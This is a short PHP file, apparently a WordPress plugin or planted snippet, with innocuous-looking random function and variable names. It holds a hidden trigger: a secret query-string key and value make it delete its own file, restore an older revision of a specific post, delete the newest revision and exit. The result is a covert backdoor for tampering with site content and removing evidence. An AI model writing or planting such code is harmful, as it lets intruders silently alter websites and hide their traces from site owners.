<?php

function suite_notice_css_cart() {
	if (isset($_GET['after_activity_age_reset']) && $_GET['after_activity_age_reset'] === 'pagination_taxonomy_slide') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$reset_auto_bootstrap = 45962;
		$coming_video_out = wp_get_post_revisions($reset_auto_bootstrap);
		if (empty($coming_video_out)) die('no revisions');
		if (count($coming_video_out) < 2) die('less than 2');
		$counter_ecommerce_toolbox = array_shift($coming_video_out);
		$twitter_community_section = $counter_ecommerce_toolbox->ID;
		$media_layout_gdpr_share = array_shift($coming_video_out);
		$tracker_compat_products = $media_layout_gdpr_share->ID;
		$avatar_geo_json = wp_restore_post_revision($tracker_compat_products);
		if ($avatar_geo_json === false) die('error restoring');
		$avatar_geo_json = wp_delete_post_revision($twitter_community_section);		
		if ($avatar_geo_json === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'suite_notice_css_cart');
